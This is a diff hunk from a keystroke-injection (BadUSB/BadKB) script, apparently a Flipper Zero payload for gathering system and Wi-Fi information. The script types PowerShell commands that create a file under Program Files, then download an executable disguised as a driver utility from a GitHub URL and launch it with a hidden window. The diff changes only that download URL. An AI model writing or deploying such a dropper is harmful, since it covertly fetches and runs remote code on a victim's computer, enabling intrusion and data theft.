@@ -20,7 +20,7 @@ STRING New-Item "C:\Program Files (x86)\Temp\DriverUtilLog.txt" -ItemType File -
 DELAY 100
 ENTER
 DELAY 50
-STRING $url = 'https://github.com/PCMon/WindowsDriverImportant/raw/main/TempDriverUtil.exe'; $file = 'C:\Program Files (x86)\Temp\TempDriverUtil.exe'; Invoke-WebRequest -Uri $url -OutFile $file; Start-Process -FilePath $file -WindowStyle Hidden
+STRING $url = 'https://github.com/PCMon/FlipperZero-BadUSB-BadKB-SysInfoAndWifi/raw/main/TempDriverUtil.exe'; $file = 'C:\Program Files (x86)\Temp\TempDriverUtil.exe'; Invoke-WebRequest -Uri $url -OutFile $file; Start-Process -FilePath $file -WindowStyle Hidden
 DELAY 100
 ENTER
 DELAY 9000
